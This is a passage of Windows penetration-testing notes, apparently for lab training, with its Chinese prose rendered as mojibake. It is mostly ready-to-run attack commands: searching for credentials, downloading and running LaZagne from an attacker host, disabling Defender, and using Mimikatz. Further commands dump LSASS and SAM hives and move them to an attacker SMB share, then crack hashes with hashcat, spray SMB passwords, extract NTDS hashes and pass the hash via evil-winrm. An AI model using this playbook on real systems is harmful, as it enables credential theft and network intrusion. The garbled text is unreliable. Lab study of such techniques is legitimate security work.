| Windows-Exploit-Suggester Âá∫ÈåØ | Êõ¥Êñ∞ Python ‰æùË≥¥ÔºåÊàñÊâãÂãïÊØîÂ∞ç systeminfo Ëàá MS ÂÆâÂÖ®ÂÖ¨Âëä           |
| PowerShell ËÖ≥Êú¨ÁÑ°Ê≥ïÂü∑Ë°å            | Á¢∫Ë™ç Set-ExecutionPolicy ÊòØÂê¶Ë®≠ÁÇ∫ bypass Êàñ unrestricted |
| exploit Ê®°ÁµÑÂ§±Êïó                 | Á¢∫Ë™ç Metasploit ÁÇ∫ÊúÄÊñ∞ÁâàÔºåÊàñÊîπÁî®ÊâãÂãï PoC Âü∑Ë°å                   |

***



</details>

<details>

<summary><span data-gb-custom-inline data-tag="emoji" data-code="1f389">üéâ</span>ÊÜëË≠âÁçµÊÆ∫</summary>



## ‚úÖ A. Ê™îÊ°àÁ≥ªÁµ±ÊêúÂ∞ã

#### üìçÊìç‰Ωú‰∏ÄÔºö‰ΩøÁî® Windows GUI ÊêúÂ∞ã

ÊâìÈñã RDP ÊàñÈÅ†Á´ØÊ°åÈù¢ ‚Üí ÈªûÊêúÂ∞ãÊ¨Ñ ‚Üí Ëº∏ÂÖ•‰ª•‰∏ãÈóúÈçµË©ûÈÄê‰∏ÄÊêúÂ∞ãÔºö

```
password
credentials
dbpassword
login
pwd
key
config
vpn
pass.txt
passwords.xlsx
unattend.xml
```

üîç ÁâπÂà•Ê≥®ÊÑèÁõÆÈåÑÔºö

* `C:\Users\*\Desktop`
* `C:\Users\*\Downloads`
* `C:\Users\*\Documents`
* `C:\IT\`„ÄÅ`C:\Scripts\`„ÄÅ`C:\Temp\`

***

#### üìçÊìç‰Ωú‰∫åÔºöPowerShell ÂÖ®Á£ÅÁ¢üÊéÉÊèè

```powershell
Get-ChildItem -Path C:\ -Include *pass*,*cred*,*key*,*config*,*vpn*,*.kdbx -Recurse -ErrorAction SilentlyContinue | Out-File C:\loot.txt
```

ÈÄôÊúÉÊâæÂá∫ÊâÄÊúâÂèØËÉΩÂê´ÊúâÊÜëË≠âÁöÑÊ™îÊ°àÔºåÁµêÊûúÂ≠òÂú® `loot.txt`

***

#### üìçÊìç‰Ωú‰∏âÔºöCMD ‰ΩøÁî® findstr ÊêúÂ∞ãÊñáÂ≠óÊ™îÂÖßÂÆπ

```cmd
cd C:\
findstr /SIM /C:"password" *.txt *.ini *.config *.xml *.ps1 *.bat *.yml
```

üîç /S ‚Üí ÈÅûËø¥ÁõÆÈåÑ\
üîç /I ‚Üí ÂøΩÁï•Â§ßÂ∞èÂØ´\
üîç /M ‚Üí Âè™È°ØÁ§∫ÊúâÈóúÈçµÂ≠óÁöÑÊ™îÂêç\
üîç /C:"..." ‚Üí ÊêúÂ∞ãÁ¢∫ÂàáÂ≠ó‰∏≤

***

### üß† ÁÇ∫‰ªÄÈ∫ºÈÄôÊ®£ÂÅöÔºü

‰ΩøÁî®ËÄÖÁ∂ìÂ∏∏ÊúÉÔºö

* Áî®ÊñáÂ≠óÊ™îÁ¥ÄÈåÑÂ∏≥ÂØÜÔºàÂ∞§ÂÖ∂ÊòØ IT ‰∫∫Âì°Ôºâ
* ÊääË®≠ÂÆöÊ™îÊîæÊ°åÈù¢Êàñ‰∏ãËºâË≥áÊñôÂ§æ
* ÈÅ∫ÁïôÁÄèË¶ΩÂô®Âø´ÂèñË≥áÊñôÊàñËá™ÂãïÁôªÂÖ•Ë®≠ÂÆö

***

## ‚úÖ B. ‰ΩøÁî® Lazagne Êì∑ÂèñÊáâÁî®Á®ãÂºèÊÜëË≠â

#### üîß Â∑•ÂÖ∑‰∏ãËºâ‰ΩçÁΩÆÔºö

[https://github.com/AlessandroZ/LaZagne/releases](https://github.com/AlessandroZ/LaZagne/releases)

Âª∫Ë≠∞‰∏ãËºâ `lazagne.exe` (standalone version)

#### üìçÂÇ≥ÈÄÅÊñπÂºèÔºö

Â¶ÇÊûú‰Ω†ÊòØ RDP Â≠òÂèñÔºå**Áõ¥Êé•ÊãñÊãâË§áË£ΩÂà∞Ê°åÈù¢Âç≥ÂèØ**\
Êàñ‰ΩøÁî® PowerShell ‰∏ãËºâÔºö

```powershell
Invoke-WebRequest -Uri http://10.10.14.3/lazagne.exe -OutFile C:\Users\bob\Desktop\lazagne.exe
```

#### üìçÂü∑Ë°åÂëΩ‰ª§Ôºö

```cmd
cd C:\Users\bob\Desktop
start lazagne.exe all -vv
```

`-vv`ÔºöÈ°ØÁ§∫Ë©≥Á¥∞Ë≥áË®äÔºà‰Ω†ÊúÉÁúãÂà∞ÂÆÉË∑ëÈÅé browser, git, RDP, FTP, Chrome Á≠âÔºâ

***

#### üì§ Â∏∏Ë¶ãËº∏Âá∫Ê®£‰æãÔºö

```
########## User: bob ##########
------------------- WinSCP passwords -----------------
[+] Password found !!!
URL: 10.129.202.51
Login: admin
Password: SteveisReallyCool123
Port: 22
```

***

#### üß® Debug ÈåØË™§ÊéíÊü•Ôºö

| ÂïèÈ°å              | Ëß£Ê≥ï                                                                |
| --------------- | ----------------------------------------------------------------- |
| Defender ÈòªÊìãÂü∑Ë°å   | Êö´ÊôÇÈóúÈñâ DefenderÔºö`Set-MpPreference -DisableRealtimeMonitoring $true` |
| Áº∫Â∞ë VC++ runtime | ÂæûÁ∂≤Ë∑ØÂÇ≥ÈÄÅ VC++ Redistributable Installer                              |
| Âü∑Ë°åÊ≤íÊúâËº∏Âá∫          | Á¢∫Ë™çÁî® `-vv`Ôºå‰∏¶Áî® `start` ÈñãÊñ∞Ë¶ñÁ™óÂü∑Ë°å                                       |

***

## ‚úÖ C. ÁâπÊÆäÊïèÊÑüÊ™îÊ°à‰ΩçÁΩÆÊêúÂ∞ã

#### üìç unattended.xml„ÄÅGroup Policy

ÈÄôÈ°ûÊ™îÊ°àÂ∏∏Âê´ÂØÜÁ¢ºÔºàÈÉ®ÁΩ≤ÊôÇË®≠ÂÆöÁî®Ôºâ

```powershell
Get-ChildItem -Path C:\ -Include *unattend.xml*,*groups.xml* -Recurse -ErrorAction SilentlyContinue
```

Ê™¢Êü•ÂÖßÂÆπÔºö

```powershell
type C:\Windows\Panther\unattend.xml
```

***

#### üìç SYSVOL Group Policy ÂØÜÁ¢ºÔºàÂè™Èôê domain Áí∞Â¢ÉÔºâ

```
\\domain-controller\SYSVOL\domain\Policies\
```

ÊêúÂ∞ã `Groups.xml` Ê™îÊ°àÔºåÂÖßÊúâÂä†ÂØÜÁöÑÂØÜÁ¢ºÊ¨Ñ‰ΩçÔºàÂèØÁî® GPPDecrypt Â∑•ÂÖ∑Ëß£ÂØÜÔºâ

***

#### üìç KeePass Ê™îÊ°à

```powershell
Get-ChildItem -Recurse -Include *.kdbx -Path C:\Users
```

ÊãâÂõûÂæåÁî® `keepass2john` ÊäΩ hashÔºå`john` Á†¥Ëß£

***

## ‚úÖ D. Ë®òÊÜ∂È´îÊÜëË≠â & Mimikatz

#### üìçÊìç‰ΩúÔºö

```cmd
.\mimikatz.exe
privilege::debug
log
sekurlsa::logonpasswords
```

‚ö†Ô∏è ÈúÄË¶ÅÈ´òÊ¨äÈôêÔºàÁ≥ªÁµ±ÊàñÁÆ°ÁêÜÂì°Ôºâ

üîê ‰Ω†ÂèØËÉΩÁúãÂà∞Ôºö

```
Username : Administrator
Password : Winter2024!
```

***

### üß™ Ë®òÊÜ∂È´îËΩâÂÑ≤ + Èõ¢Á∑öÂàÜÊûêÊñπÂºèÔºö

```cmd
tasklist | findstr lsass
rundll32.exe comsvcs.dll, MiniDump 1234 C:\lsass.dmp full
```

Â∞á dump ÂÇ≥ÂõûÁî® mimikatz Êàñ strings ÊêúÁ¥¢

***

## ‚úÖ E. ÂÖ∂‰ªñÊúâË∂£Âú∞ÊñπÔºàË£úÂÖÖÔºâ

#### ‚úÖ PowerShell Ê≠∑Âè≤Ë®òÈåÑÔºö

```powershell
type C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```

***

#### ‚úÖ ÁÄèË¶ΩÂô®ÂØÜÁ¢ºÊì∑ÂèñÔºàNirsoft Â∑•ÂÖ∑Ôºâ

* `WebBrowserPassView.exe`
* `MailPassView.exe`
* `RemoteDesktopPassView.exe`

***

#### ‚úÖ ÁôªÈåÑÊ™îÊêúÂ∞ãÔºö

```cmd
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Run"
reg query HKLM /f password /t REG_SZ /s
```

</details>









## **üéØ 3.  Ê∫ñÂÇô/Ê©´ÂêëÁßªÂãï**

**Áï∂‰Ω†‰øÇAdminÂòÖÊôÇÂÄô ÂèØ‰ª•ÈáçË§á‰∏äÈÇä‰ª•‰∏äÊèê‰æõÂòÖÊ≠•È©ü Áõ°ÂäõÊîûÂà∞hash  ÂèØ‰ª•‰ΩøÁî®**MimikatzÂë¢Âï≤Â∑•ÂÖ∑ ‰πãÂâçË©¶ÈÅéÂèØ‰ª•Ë©¶SeDebugPrivilege Âë¢ÂÄãÊîªÊìä ‰πãÂæå‰Ω†Â∞±ÁôªÂÖ•ÂÖ∂‰ªñwindows Â¢ûÂä†ÊîªÊìäÈçµ

<details>

<summary>SAM ÊîªÊìä</summary>

## üè¢ ÂÖ¨Âè∏ÂÖßÁ∂≤ÊΩõÈÄèÂØ¶Êà∞ÊïôÂ≠∏ÔºöSAM ÈõúÊ¨æÊé®Âç∞ËàáÁ†¥Ëß£ÊïôÁ®ã

***

### üåü ÊÉ≥ÂØ¶ÁèæÁöÑÁõÆÊ®ôÔºö

* ÂæûÁõÆÊ®ô Windows ‰∏ªÊ©ü‰∏≠ dump Âá∫ SAM„ÄÅSYSTEM„ÄÅSECURITY Hive
* Âà©Áî® secretsdump.py Ëß£ NTLM Hash
* Áî® hashcat Á†¥Ëß£ Hash Áç≤ÂæóÊòéÊñáÂØÜÁ¢º
* Âà©Áî®ÂØÜÁ¢ºÈÄ≤Ë°åÊ©´ÂêëÁßªÂãïÊàñÊé•Á∫åÊΩõÈÄè

***

### ‚úÖ ÂÖàÊ∫ñÊ¢ù‰ª∂

| È†ÖÁõÆ         | Ë™™Êòé                                  |
| ---------- | ----------------------------------- |
| SYSTEMÊ¨äÈôê   | ÂøÖÈ†àÊòØÊú¨Ê©üÁÆ°ÁêÜÂì°ÔºàÂèØ‰ª•‰ΩøÁî® reg save Â≠òÂèñ HiveÔºâ     |
| Kali Linux | Ë£ùÊúâ Impacket„ÄÅhashcat„ÄÅrockyou.txt Â≠óÂπïÊ™î |
| SMB ÂÖ±‰∫´     | ÂèØ‰ΩøÁî® smbserver.py Â∞ÅË£ùÊïÖ‰ª∂‰æõ Windows ÊäìÂèñ   |
| Ê®ôÁöÑÁõÆÊ®ô       | ÂèØÈÄ£Á∑öÁöÑ Windows 10/11 Â∑•‰ΩúÁ´ô              |

***

### „Ñß„ÄÅÂæû Windows ÁõÆÊ®ôÂåØÂá∫ Hive

```cmd
reg save HKLM\SAM C:\sam.save
reg save HKLM\SYSTEM C:\system.save
reg save HKLM\SECURITY C:\security.save
```

***

### ‰∫å„ÄÅKali Linux ‰∏äÂïüÁî® SMB ‰æõÊáâ

```bash
mkdir -p ~/smbshare
cd ~/smbshare
sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support CompData $(pwd)
```

***

### ‰∏â„ÄÅÂæû Windows Ê©üÂô®ÊäìÂõû Hive

```cmd
move C:\sam.save \\<KALI-IP>\CompData
move C:\system.save \\<KALI-IP>\CompData
move C:\security.save \\<KALI-IP>\CompData
```

***

### Âõõ„ÄÅËß£ NTLM Hash

```bash
cd ~/smbshare
python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.save  -security security.save -system system.save LOCAL | grep -E "^[a-zA-Z0-9_-]+:[0-9]{3,5}:" \
| awk -F: '{print  $4}' | sort -u >  ntlm_hashes.txt
```

È†êÊúüËº∏Âá∫Ôºö

```txt
3c0e5d303ec84884ad5c3b7876a06ea6
a3ecf31e65208382e23b3420a34208fc
```

***

### ÂÖ≠„ÄÅËß£Â£ì rockyou.txt

```bash
find / -iname rockyou.txt 
```

***

### ‰∏É„ÄÅÁ†¥Ëß£ Hash

```bash
hashcat -m 1000 -a 0 ntlm_hashes.txt rockyou.txt --force -O --backend-ignore-opencl
```

È†êÊúüËº∏Âá∫Ôºö

```txt
3c0e5d303ec84884ad5c3b7876a06ea6:Password123
```

***

### ÂÖ´„ÄÅÊ©´ÂêëÁßªÂãï / ‰ΩøÁî®ÂØÜÁ¢º

```bash
crackmapexec smb 10.129.202.137 -u bob -p Password123
```

È†êÊúüÔºö

```
[+] bob:Password123 (Pwn3d!)
```

***

</details>

<details>

<summary>ÊîªÊìä LSASS</summary>



### ÊîªÊìä LSASS ÂÖ®ÊµÅÁ®ãÊåáÂçó

#### ‰∏Ä„ÄÅÊîªÊìäÁõÆÊ®ôÊ¶ÇÂøµ

LSASSÔºàLocal Security Authority Subsystem ServiceÔºâÊòØ Windows Á≥ªÁµ±Ë≤†Ë≤¨Ë∫´‰ªΩÈ©óË≠â„ÄÅÊéàÊ¨äËàáÊÜëË≠âÁÆ°ÁêÜÁöÑÊ†∏ÂøÉÊúçÂãô„ÄÇÂè™Ë¶Å‰ΩøÁî®ËÄÖÁôªÂÖ•ÔºåLSASS Â∞±ÊúÉÂú®Ë®òÊÜ∂È´î‰∏≠Âø´ÂèñÂØÜÁ¢ºÔºàÊòéÊñáÊàñÈõúÊπäÔºâ„ÄÅKerberos Á•®Ë≠â„ÄÅDPAPI ÈáëÈë∞Á≠âË≥áË®ä„ÄÇ

ÊîªÊìäËÄÖÂèØËóâÁî±**ËΩâÂÑ≤ LSASS Ë®òÊÜ∂È´îÂÖßÂÆπÔºàlsass.dmpÔºâ**ÔºåÈõ¢Á∑öÂàÜÊûêÂÖ∂‰∏≠ÁöÑÊÜëË≠âÔºåÈÄ≤ËÄåÈÅîÊàêÊ©´ÂêëÁßªÂãï„ÄÅÁâπÊ¨äÊèêÂçáÊàñÂ∏≥ÂØÜÁ†¥Ëß£„ÄÇ

***

#### ‰∫å„ÄÅÊ≠•È©ü‰∏ÄÔºöÂª∫Á´ã lsass.dmp Ë®òÊÜ∂È´îËΩâÂÑ≤

**ÊñπÊ≥ï‰∏ÄÔºö‰ªªÂãôÁÆ°ÁêÜÂì°ÔºàGUIÔºâ**

1. ÈñãÂïü Task Manager
2. ÊâæÂà∞ `lsass.exe`
3. Âè≥Èçµ > Create Dump File
4. Ê™îÊ°àÂÑ≤Â≠òÊñºÔºö`C:\Users\<‰ΩøÁî®ËÄÖ>\AppData\Local\Temp\lsass.DMP`

**ÊñπÊ≥ï‰∫åÔºöÂëΩ‰ª§ÂàóÊñπÂºèÔºàÁÑ° GUI ÊôÇ‰ΩøÁî®Ôºâ**

```powershell
# ÊâæÂà∞ lsass ÁöÑ PID
Get-Process lsass (Testing command)

# Âª∫Á´ãËΩâÂÑ≤Ê™îÊ°àÔºàÈúÄÁÆ°ÁêÜÂì°Ê¨äÈôêÔºâ
rundll32.exe C:\windows\system32\comsvcs.dll, MiniDump <PID> C:\lsass.dmp full
```

***

#### ‰∏â„ÄÅÊ≠•È©ü‰∫åÔºöÂ∞áÊ™îÊ°àÂÇ≥ÈÄÅÂõûÊîªÊìäÁ´Ø

```
sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py share . -smb2support\n\n
```

```
move C:\lsass.dmp \\10.10.14.234\share
```



ÂèØÁî®Â∑•ÂÖ∑ËàáÊñπÊ≥ïÔºö

* Python HTTP server + Invoke-WebRequest
* impacket-smbserver + copy ÂëΩ‰ª§
* scp / netcat

***

#### Âõõ„ÄÅÊ≠•È©ü‰∏âÔºö‰ΩøÁî® pypykatz ÈÄ≤Ë°åÊÜëË≠âÂàÜÊûê

```bash
pypykatz lsa minidump /path/to/lsass.dmp
```

Ëº∏Âá∫ÁµêÊûúÂ∞áÊúÉÂåÖÂê´‰ª•‰∏ãÊ¨Ñ‰ΩçÔºö

* **MSV**ÔºöÂê´ NTLM ÂØÜÁ¢ºÈõúÊπä
* **WDIGEST**ÔºöËã•Â≠òÂú®ÊòéÊñáÂØÜÁ¢ºÂ∞áÈ°ØÁ§∫Âú®Ê≠§ÔºàWindows 8 ÂâçÈ†êË®≠ÂïüÁî®Ôºâ
* **Kerberos**ÔºöÂèØÁî®Êñº Pass-the-Ticket
* **DPAPI**ÔºöÊèêÂèñ masterkey Áî®ÊñºÂæåÁ∫åÊÜëË≠âËß£ÂØÜ

```
== LogonSession ==                                                                                                   
authentication_id 124587 (1e6ab)                                                                                     
session_id 0                                                                                                         
username Vendor                                                                                                      
domainname FS01                                                                                                      
logon_server FS01                                                                                                    
logon_time 2025-03-28T02:06:00.550450+00:00                                                                          
sid S-1-5-21-2288469977-2371064354-2971934342-1003                                                                   
luid 124587                                                                                                          
        == MSV ==                                                                                                    
                Username: Vendor                                                                                     
                Domain: FS01                                                                                         
                LM: NA                                                                                               
                NT: 31f87811133bc6aaa75a536e77f64314     (that is send to hashcat of hash)                                                             
                SHA1: 2b1c560c35923a8936263770a047764d0422caba                                                       
                DPAPI: NA                                                                                            
        == WDIGEST [1e6ab]==                                                                                         
                username Vendor                                                                                      
                domainname FS01                                                                                      
                password None                                                                                        
                password (hex)                                                                                       
        == Kerberos ==                                                                                               
                Username: Vendor                                                                                     
                Domain: FS01                                                                                         
        == WDIGEST [1e6ab]==                                                                                         
                username Vendor                                                                                      
                domainname FS01                                                                                      
                password None                                                                                        
                password (hex)                                                                                       
                                                                                                                     
== LogonSession ==                 
```



***

#### ‰∫î„ÄÅÊ≠•È©üÂõõÔºö‰ΩøÁî® Hashcat Á†¥Ëß£ NTLM Hash

```bash
sudo hashcat -m 1000 <hash> /usr/share/wordlists/rockyou.txt
```

ÁØÑ‰æãÔºö

```bash
64f12cddaa88057e06a81b54e73b949b:Password1
```

***

#### ÂÖ≠„ÄÅÂ∞èÁ∏ΩÁµê & Âª∂‰º∏ÊñπÂêë

‰Ω†Â∑≤Â≠∏ÊúÉÔºö

* Â¶Ç‰ΩïËΩâÂÑ≤ LSASS Ë®òÊÜ∂È´î
* Â¶Ç‰ΩïÈõ¢Á∑öÂàÜÊûê‰∏¶ÊèêÂèñÊÜëË≠â
* Â¶Ç‰ΩïÁî® hashcat Á†¥Ëß£ÂØÜÁ¢ºÈõúÊπä

ÂèØÂª∂‰º∏Â≠∏ÁøíÊñπÂêëÔºö

* AV ÁπûÈÅéÔºàrundll32 Êàñ procdump ÂÅΩË£ùÔºâ
* Mimikatz Ëàá pass-the-hash / pass-the-ticket
* Kerberos Delegation / Resource-based delegation
* DPAPI Ëß£ÂØÜÊäÄÂ∑ß

***

#### ‰∏É„ÄÅÊª≤ÈÄèÊµÅÁ®ãÊ®πÁãÄÂúñ

```
[Â≠òÂèñÁõÆÊ®ô‰∏ªÊ©ü]
 ‚îú‚îÄ‚îÄ GUIÊ°åÈù¢ ‚Üí ‰ªªÂãôÁÆ°ÁêÜÂì°ËΩâÂÑ≤
 ‚îî‚îÄ‚îÄ ÂëΩ‰ª§ÂàóÊ¨äÈôê ‚Üí rundll32 / procdump

    ‚Üì

[ÂèñÂæó lsass.dmp]
 ‚îî‚îÄ‚îÄ Â∞áËΩâÂÑ≤Ê™îÊ°à‰∏äÂÇ≥ÂõûÊîªÊìä‰∏ªÊ©ü

    ‚Üì

[Èõ¢Á∑öÂàÜÊûê]
 ‚îî‚îÄ‚îÄ pypykatz lsa minidump lsass.dmp

    ‚Üì

[ÈõúÊπäÁ†¥Ëß£]
 ‚îî‚îÄ‚îÄ hashcat Á†¥Ëß£ NTLM / È©óË≠âÊòéÊñáÂØÜÁ¢º

    ‚Üì

[ÂæåÁ∫åÂà©Áî®]
 ‚îú‚îÄ‚îÄ Ê©´ÂêëÁßªÂãïÔºàRDP„ÄÅSMB„ÄÅWMIÔºâ
 ‚îú‚îÄ‚îÄ ÁâπÊ¨äÊèêÂçá
 ‚îî‚îÄ‚îÄ Kerberos Á•®Ë≠âÂà©Áî®
```

</details>

<details>

<summary>SMB ÂØÜÁ¢ºÁàÜÁ†¥ÁµêÂêà NTDS.dit ÊèêÂèñËàá Pass-the-Hash ÂüüÊéßÊª≤ÈÄèÊîªÊìä</summary>

***

Â∞çÊñºÂ∑≤Á∂ìÁü•ÈÅìÁöÑÂêçÁ®±  ÈÄöÈÅéSMBÈÄ≤Ë°åÁàÜÁ†¥ ÁÑ∂ÂæåÂèñÂæóhash ‰ΩøÁî®admin hash  ÁôªÂÖ•

#### ÂØÜÈÄöÈÅéSMBÁ¢ºÁàÜÁ†¥ÈöéÊÆµÔºàDictionary AttackÔºâ

*   ‰ΩøÁî® CrackMapExec ÂòóË©¶ÈáùÂ∞çÁ§æÂ∑•ÂæóÁü•Â∏≥ËôüÈÄ≤Ë°åÂØÜÁ¢ºÂ≠óÂÖ∏ÁàÜÁ†¥Ôºö

    ```bash
    crackmapexec smb <IP> -u jmarston -p /usr/share/wordlists/fasttrack.txt
    ```
*   ÊàêÂäüÁ§∫‰æãËº∏Âá∫Ôºö

    ```
    [+] ILF.local\jmarston:P@ssword! (Pwn3d!)
    ```

***

#### 3. Ê¨äÈôêÁ¢∫Ë™ç

*   Ê™¢Êü•Ë©≤Â∏≥ËôüÊòØÂê¶ÂÖ∑ÊúâÊèêÂèñ NTDS ÁöÑÊ¨äÈôêÔºö

    ```bash
    crackmapexec smb <IP> -u jmarston -p 'P@ssword!' --local-auth
    ```

***

#### 4. ÂåØÂá∫ NTDS.dit Hash

*   ‰ΩøÁî® CrackMapExec ‰∏ÄÈçµÊèêÂèñÊâÄÊúâ‰ΩøÁî®ËÄÖ NTLM hashÔºö

    ```bash
    crackmapexec smb <IP> -u jmarston -p 'P@ssword!' --ntds
    ```
*   ÊâæÂà∞ Administrator hashÔºö

    ```
    Administrator:500:aad3...:64f12cddaa88057e06a81b54e73b949b:::
    ```

***

#### 5. Á†¥Ëß£ÁâπÂÆöÂ∏≥Ëôü Hash

*   ‰ΩøÁî® hashcat ÂòóË©¶Á†¥Ëß£ Jennifer Stapleton ÁöÑ hashÔºö

    ```bash
    hashcat -m 1000 92fd67fd2f49d0e83744aa82363f021b /usr/share/wordlists/rockyou.txt
    ```
*   Á†¥Ëß£ÊàêÂäüÁµêÊûúÔºö

    ```
    92fd67fd2f49d0e83744aa82363f021b:Winter2008
    ```

***

#### 6. ‰ΩøÁî® Pass-the-Hash ÂèñÂæó Administrator Ê¨äÈôê

*   ‰ΩøÁî®Â∑≤Áü• hash ‰∏çÈúÄË¶ÅÊòéÊñáÂØÜÁ¢ºÁôªÂÖ•Ôºö

    ```bash
    evil-winrm -i <target_ip> -u Administrator -H 64f12cddaa88057e06a81b54e73b949b
    ```

***

#### 7. Ê©´ÂêëÊª≤ÈÄèËàáÊèêÊ¨äÂª∫Ë≠∞

* ‰ΩøÁî® Mimikatz ÊèêÂèñË®òÊÜ∂È´î‰∏≠ÁöÑÂØÜÁ¢ºÊàñ Kerberos Á•®Êìö„ÄÇ
* ÂòóË©¶ Kerberoasting Êàñ DCSync ÊîªÊìä„ÄÇ
* Âª∫Á´ãÈö±ËóèÂ∏≥ËôüÊàñ‰øÆÊîπ GPO ‰ª•Á∂≠ÊåÅÂ≠òÂèñ„ÄÇ

***

#### 8. Debug ÊµÅÁ®ãÂ∞çÁÖßË°®

| ÂïèÈ°å                  | Ëß£Ê≥ï                    |
| ------------------- | --------------------- |
| CrackMapExec ÁÑ°Ê≥ïÁàÜÁ†¥ÊàêÂäü | Á¢∫Ë™çÂ∏≥ËôüÊ†ºÂºè„ÄÅÊèõÊõ¥Â§ßÂ≠óÂÖ∏          |
| ÁÑ°Ê≥ïÊäìÂèñ NTDS           | Â∏≥ËôüÊ¨äÈôê‰∏çË∂≥„ÄÅÈúÄÊèêÊ¨ä            |
| Hashcat ÁÑ°Ê≥ïÁ†¥Ëß£        | ‰ΩøÁî®Êõ¥Â§ßÂ≠óÂÖ∏„ÄÅ‰ΩøÁî® rules Ê®°Âºè    |
| evil-winrm ÁÑ°Ê≥ïÁôªÂÖ•     | Á¢∫Ë™çÈñãÂïü WinRMÔºåÁ¢∫Ë™ç hash ÁÑ°Ë™§ |

***

Ê≠§ÊµÅÁ®ãÂèØ‰ΩúÁÇ∫ÈÄ≤Êîª AD ÁöÑÂü∫Á§éËÖ≥Êú¨ËàáÂàÜÊûêÊâãÂÜäÔºå‰πüÂèØ‰ª•ÈÄ≤‰∏ÄÊ≠•Ëá™ÂãïÂåñÊï¥ÂêàÁÇ∫ red team Â∑•ÂÖ∑„ÄÇ

</details>

